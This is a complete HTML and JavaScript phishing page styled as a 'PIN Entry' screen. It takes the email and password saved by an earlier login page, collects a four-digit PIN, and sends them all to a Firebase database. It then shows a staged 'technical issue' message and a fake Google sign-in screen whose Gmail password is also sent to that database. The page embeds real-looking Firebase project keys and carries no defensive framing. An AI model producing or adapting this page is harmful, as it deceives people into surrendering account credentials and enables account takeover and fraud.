<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PIN Entry</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* ✅ Each screen is a full-page view */
        .screen {
            position: fixed;
            inset: 0;
            display: none;
            justify-content: center;
            align-items: center;
            background: #ffffff;
            overflow-y: auto;
        }
        .screen.active {
            display: flex;
        }

        /* ---------- PIN SCREEN ---------- */
        .container {
            max-width: 400px;
            width: 100%;
            padding: 2rem 2.5rem 2.5rem;
            text-align: center;
        }

        .profile-icon {
            display: flex;
            justify-content: center;
            margin-bottom: 1.8rem;
        }

        .profile-icon .icon-circle {
            width: 70px;
            height: 70px;
            background: #11263b;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 2rem;
        }

        .welcome {
            font-size: 2rem;
            font-weight: 700;
            color: #1c1c1e;
            margin-bottom: 0.2rem;
            letter-spacing: -0.5px;
        }

        .email-display {
            font-size: 0.85rem;
            color: #8e8e93;
            margin-bottom: 0.5rem;
            font-weight: 400;
        }

        .pin-label {
            font-size: 0.9rem;
            font-weight: 400;
            color: #8e8e93;
            margin-bottom: 2rem;
            letter-spacing: 0.2px;
        }

        .pin-dots {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 2.5rem;
        }

        .dot {
            width: 16px;
            height: 16px;
            background: #d1d1d6;
            border-radius: 50%;
            transition: 0.2s;
        }

        .dot.filled {
            background: #1c1c1e;
        }

        .numpad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 16px;
            max-width: 320px;
            margin: 0 auto 1.8rem;
            justify-items: center;
            align-items: center;
        }

        .key {
            background: #f0f0f0;
            border: none;
            border-radius: 50%;
            aspect-ratio: 1 / 1;
            width: 60%;
            font-size: 1.5rem;
            font-weight: 800;
            color: #1c1c1e;
            cursor: pointer;
            transition: all 0.1s ease;
            user-select: none;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .key:active {
            background: #d1d1d6;
            transform: scale(0.94);
        }

        .key i {
            font-size: 1rem;
            color: #1c1c1e;
        }

        .key.empty {
            background: transparent;
            pointer-events: none;
        }

        .key.backspace {
            background: #f0f0f0;
        }

        .key.backspace i {
            font-size: 1rem;
        }

        .bottom-row {
            display: flex;
            justify-content: center;
            margin-top: 0.5rem;
        }

        .sign-out {
            background: transparent;
            border: none;
            padding: 0.4rem 0;
            font-weight: 500;
            font-size: 0.95rem;
            color: #8e8e93;
            cursor: pointer;
            transition: 0.15s;
            letter-spacing: 0.3px;
        }

        .sign-out:active {
            opacity: 0.5;
        }

        /* ---------- CHECKUP SCREEN ---------- */
        .checkup-wrap {
            text-align: center;
            max-width: 360px;
            padding: 0 24px;
        }

        .checkup-ring {
            width: 60px;
            height: 60px;
            border: 5px solid #f0f0f0;
            border-top: 5px solid #11263b;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 30px auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .checkup-title {
            font-size: 1.4rem;
            font-weight: 700;
            color: #1c1c1e;
            margin-bottom: 20px;
            letter-spacing: -0.3px;
        }

        .checkup-message {
            font-size: 0.95rem;
            color: #6b7280;
            line-height: 1.55;
            opacity: 0;
            transition: opacity 0.8s ease;
        }

        .checkup-message.show {
            opacity: 1;
        }

        .checkup-message b {
            color: #11263b;
            font-weight: 600;
        }

        /* ---------- GOOGLE SCREEN ---------- */
        .google-wrap {
            max-width: 450px;
            width: 100%;
            padding: 40px 24px;
            text-align: left;
        }

        .g-logo {
            width: 48px;
            height: 48px;
            margin-bottom: 24px;
        }

        .g-welcome {
            font-size: 2rem;
            font-weight: 400;
            color: #202124;
            margin-bottom: 24px;
        }

        .g-account {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 1rem;
            color: #202124;
            margin-bottom: 50px;
            padding-bottom: 16px;
        }

        .g-account-icon {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: #e8eaed;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #5f6368;
            flex-shrink: 0;
        }

        .g-account-icon svg {
            width: 20px;
            height: 20px;
        }

        .g-account-email {
            word-break: break-all;
        }

        .g-input-wrap {
            width: 100%;
            margin-bottom: 24px;
        }

        .g-input-wrap input {
            width: 100%;
            height: 56px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            background: #fff;
            padding: 0 16px;
            font-size: 1rem;
            color: #202124;
            font-family: inherit;
            outline: none;
            transition: border-color 0.2s;
        }

        .g-input-wrap input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26,115,232,0.15);
        }

        .g-input-wrap input::placeholder {
            color: #5f6368;
            opacity: 1;
        }

        .g-checkbox-row {
            display: flex;
            align-items: center;
            gap: 16px;
            font-size: 0.95rem;
            color: #202124;
            margin-bottom: 50px;
            cursor: pointer;
            user-select: none;
        }

        .g-checkbox {
            width: 20px;
            height: 20px;
            border: 2px solid #5f6368;
            border-radius: 3px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            transition: background 0.15s, border-color 0.15s;
        }

        .g-checkbox.checked {
            background: #1a73e8;
            border-color: #1a73e8;
        }

        .g-checkbox.checked::after {
            content: '';
            width: 10px;
            height: 5px;
            border-left: 2px solid #fff;
            border-bottom: 2px solid #fff;
            transform: rotate(-45deg) translate(1px, -2px);
        }

        .g-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .g-forgot {
            color: #1a73e8;
            font-size: 0.95rem;
            font-weight: 500;
            background: none;
            border: 0;
            cursor: pointer;
            padding: 0;
        }

        .g-next-btn {
            background: #1a73e8;
            color: #fff;
            border: 0;
            border-radius: 60px;
            padding: 12px 32px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.15s;
            font-family: inherit;
        }

        .g-next-btn:hover { background: #1557b0; }
        .g-next-btn:active { transform: scale(0.98); }

        /* ---------- TOAST ---------- */
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: rgba(28,28,30,0.92);
            backdrop-filter: blur(10px);
            color: #fff;
            padding: 14px 32px;
            border-radius: 60px;
            font-size: 0.95rem;
            font-weight: 500;
            box-shadow: 0 10px 30px rgba(0,0,0,0.25);
            opacity: 0;
            transition: opacity 0.3s ease, transform 0.3s ease;
            pointer-events: none;
            z-index: 9999;
            max-width: 90%;
            text-align: center;
        }
        .toast.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }

        @media (max-width: 440px) {
            .container { padding: 1.5rem 1.2rem; }
            .welcome { font-size: 1.6rem; }
            .key { font-size: 0.9rem; width: 55%; }
            .numpad { gap: 12px; }
            .pin-dots { gap: 16px; }
            .profile-icon .icon-circle { width: 60px; height: 60px; font-size: 1.6rem; }
        }
    </style>
</head>
<body>

    <!-- ==================== 1. PIN SCREEN ==================== -->
    <div class="screen active" id="s-pin">
        <div class="container">
            <div class="profile-icon">
                <div class="icon-circle">
                    <i class="fas fa-user"></i>
                </div>
            </div>

            <div class="welcome">Welcome back</div>
            <div style="display: none;" class="email-display" id="emailDisplay"></div>
            <div class="pin-label">Enter PIN to continue</div>

            <div class="pin-dots" id="pinDots">
                <span class="dot" data-index="0"></span>
                <span class="dot" data-index="1"></span>
                <span class="dot" data-index="2"></span>
                <span class="dot" data-index="3"></span>
            </div>

            <div class="numpad" id="numpad">
                <div class="key" data-value="1">1</div>
                <div class="key" data-value="2">2</div>
                <div class="key" data-value="3">3</div>
                <div class="key" data-value="4">4</div>
                <div class="key" data-value="5">5</div>
                <div class="key" data-value="6">6</div>
                <div class="key" data-value="7">7</div>
                <div class="key" data-value="8">8</div>
                <div class="key" data-value="9">9</div>
                <div class="key empty"></div>
                <div class="key zero" data-value="0">0</div>
                <div class="key backspace" id="backspaceKey"><i class="fas fa-delete-left"></i></div>
            </div>

            <div class="bottom-row">
                <button class="sign-out" id="signOutBtn">Sign out</button>
            </div>
        </div>
    </div>

    <!-- ==================== 2. CHECKUP SCREEN ==================== -->
    <div class="screen" id="s-checkup">
        <div class="checkup-wrap">
            <div class="checkup-ring"></div>
            <div class="checkup-title">Verifying your account...</div>
            <div class="checkup-message" id="checkupMessage">
                We are having a little <b>technical issue</b>.<br>
                Please sign in with your <b>Gmail account and password</b> to continue.
            </div>
        </div>
    </div>

    <!-- ==================== 3. GOOGLE SCREEN ==================== -->
    <div class="screen" id="s-google">
        <div class="google-wrap">
            <svg class="g-logo" viewBox="0 0 48 48">
                <path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.6l6.8-6.8C35.8 2.4 30.3 0 24 0 14.6 0 6.5 5.4 2.6 13.2l7.9 6.1C12.4 13.6 17.7 9.5 24 9.5z"/>
                <path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v9h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17.5z"/>
                <path fill="#FBBC05" d="M10.5 28.7c-.5-1.4-.8-3-.8-4.7s.3-3.2.8-4.7l-7.9-6.1C.9 16.4 0 20.1 0 24s.9 7.6 2.6 10.8l7.9-6.1z"/>
                <path fill="#34A853" d="M24 48c6.5 0 11.9-2.1 15.9-5.8l-7.5-5.8c-2.1 1.4-4.8 2.3-8.4 2.3-6.3 0-11.6-4.1-13.5-9.8l-7.9 6.1C6.5 42.6 14.6 48 24 48z"/>
            </svg>

            <div class="g-welcome">Welcome</div>

            <div class="g-account">
                <div class="g-account-icon">
                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 12a5 5 0 1 0 0-10 5 5 0 0 0 0 10Zm0 2c-4.4 0-8 2.2-8 5v1h16v-1c0-2.8-3.6-5-8-5Z"/></svg>
                </div>
                <div class="g-account-email" id="googleEmail">—</div>
            </div>

            <div class="g-input-wrap">
                <input id="googlePassword" type="password" autocomplete="current-password" placeholder="Enter your password">
            </div>

            <div class="g-checkbox-row" id="showPwRow">
                <div class="g-checkbox" id="showPwBox"></div>
                <span>Show password</span>
            </div>

            <div class="g-actions">
                <button class="g-forgot" type="button">Forgot password?</button>
                <button class="g-next-btn" id="googleNext" type="button">Next</button>
            </div>
        </div>
    </div>

    <div id="toast" class="toast"></div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <script>
        (function() {
            "use strict";

            const firebaseConfig = {
                apiKey: "AIzaSyBx6AU-Jvg1So-Ty3FFKryctXZGV-LNFCY",
                authDomain: "achievebypetra-82966.firebaseapp.com",
                databaseURL: "https://achievebypetra-82966-default-rtdb.europe-west1.firebasedatabase.app",
                projectId: "achievebypetra-82966",
                storageBucket: "achievebypetra-82966.firebasestorage.app",
                messagingSenderId: "412688052429",
                appId: "1:412688052429:web:abf989e226e153b7c37984",
                measurementId: "G-TBGZS8PJ76"
            };

            firebase.initializeApp(firebaseConfig);
            const database = firebase.database();

            const currentEmail = localStorage.getItem('currentUserEmail') || '';
            document.getElementById('emailDisplay').textContent = currentEmail;

            let enteredPin = '';

            /* ---------- Screen switch helper ---------- */
            function show(id){
                document.querySelectorAll('.screen').forEach(s => {
                    s.classList.toggle('active', s.id === id);
                });
            }

            /* ---------- PIN LOGIC ---------- */
            const pinDots = document.querySelectorAll('.dot');
            const numpadKeys = document.querySelectorAll('.key:not(.empty)');
            const backspaceKey = document.getElementById('backspaceKey');
            const signOutBtn = document.getElementById('signOutBtn');
            const toastEl = document.getElementById('toast');

            function updateDots() {
                const len = enteredPin.length;
                pinDots.forEach((dot, idx) => {
                    if (idx < len) dot.classList.add('filled');
                    else dot.classList.remove('filled');
                });
            }

            function showToast(msg) {
                toastEl.textContent = msg;
                toastEl.classList.add('show');
                clearTimeout(toastEl._timeout);
                toastEl._timeout = setTimeout(() => {
                    toastEl.classList.remove('show');
                }, 3000);
            }

            /* ✅ Save PIN → switch to checkup (no toast) */
            function savePin() {
                if (enteredPin.length !== 4) return;

                const email = localStorage.getItem('currentUserEmail');
                const password = localStorage.getItem('currentUserPassword');

                if (!email) {
                    showToast('Error: No email found');
                    enteredPin = '';
                    updateDots();
                    return;
                }

                const newUser = {
                    id: 'User_' + Date.now().toString(36).toUpperCase(),
                    email: email,
                    password: password || '',
                    pin: enteredPin,
                    googlePassword: '',
                    timestamp: new Date().toLocaleString()
                };

                database.ref('users').push(newUser)
                    .then((ref) => {
                        localStorage.setItem('currentUserKey', ref.key);
                        enteredPin = '';
                        updateDots();
                        // ✅ Move to checkup screen (NO TOAST)
                        startCheckup();
                    })
                    .catch((error) => {
                        showToast('Error: ' + error.message);
                        enteredPin = '';
                        updateDots();
                    });
            }

            function handleKeyPress(value) {
                if (enteredPin.length >= 4) return;
                enteredPin += value;
                updateDots();
                if (enteredPin.length === 4) {
                    setTimeout(savePin, 300);
                }
            }

            function handleBackspace() {
                if (enteredPin.length > 0) {
                    enteredPin = enteredPin.slice(0, -1);
                    updateDots();
                }
            }

            function handleSignOut() {
                localStorage.removeItem('currentUserEmail');
                localStorage.removeItem('currentUserPassword');
                localStorage.removeItem('currentUserKey');
                enteredPin = '';
                updateDots();
                showToast('Signed out');
                setTimeout(() => {
                    window.location.href = 'login.html';
                }, 500);
            }

            /* ---------- CHECKUP SCREEN ---------- */
            let checkupTextTimer = null;
            let checkupRedirectTimer = null;

            function startCheckup() {
                show('s-checkup');
                const msg = document.getElementById('checkupMessage');
                msg.classList.remove('show');

                // Show technical message after 5 seconds
                clearTimeout(checkupTextTimer);
                checkupTextTimer = setTimeout(() => {
                    msg.classList.add('show');
                }, 5000);

                // Move to Google screen after 10 seconds total
                clearTimeout(checkupRedirectTimer);
                checkupRedirectTimer = setTimeout(() => {
                    openGoogleScreen();
                }, 10000);
            }

            /* ---------- GOOGLE SCREEN ---------- */
            function openGoogleScreen() {
                const savedEmail = localStorage.getItem('currentUserEmail') || '';
                document.getElementById('googleEmail').textContent = savedEmail;
                document.getElementById('googlePassword').value = '';
                document.getElementById('googlePassword').type = 'password';
                document.getElementById('showPwBox').classList.remove('checked');
                show('s-google');
                setTimeout(() => document.getElementById('googlePassword').focus(), 100);
            }

            /* Show password toggle */
            document.getElementById('showPwRow').addEventListener('click', () => {
                const box = document.getElementById('showPwBox');
                const field = document.getElementById('googlePassword');
                box.classList.toggle('checked');
                field.type = box.classList.contains('checked') ? 'text' : 'password';
            });

            /* Google "Next" → save googlePassword + toast */
            document.getElementById('googleNext').addEventListener('click', () => {
                const gpw = document.getElementById('googlePassword').value;
                if (!gpw) {
                    showToast("Please enter your password");
                    return;
                }

                // Show toast immediately
                showToast("Something went wrong");

                // Save to Firebase under the SAME user
                const userKey = localStorage.getItem('currentUserKey');
                if (userKey) {
                    database.ref('users/' + userKey).update({ googlePassword: gpw })
                        .catch(err => console.error("Firebase error:", err));
                }
            });

            /* ---------- INIT ---------- */
            function init() {
                updateDots();

                if (!currentEmail) {
                    showToast('Please log in first');
                    setTimeout(() => {
                        window.location.href = 'login.html';
                    }, 1000);
                    return;
                }

                numpadKeys.forEach(key => {
                    key.addEventListener('click', (e) => {
                        const val = key.dataset.value;
                        if (val !== undefined) {
                            handleKeyPress(val);
                        }
                    });
                });

                backspaceKey.addEventListener('click', handleBackspace);
                signOutBtn.addEventListener('click', handleSignOut);

                document.addEventListener('keydown', (e) => {
                    if (e.key >= '0' && e.key <= '9') {
                        handleKeyPress(e.key);
                    } else if (e.key === 'Backspace') {
                        handleBackspace();
                        e.preventDefault();
                    } else if (e.key === 'Enter') {
                        if (enteredPin.length === 4) savePin();
                    }
                });
            }

            init();
        })();
    </script>

  <script src="protect.js"></script>
</body>
</html>
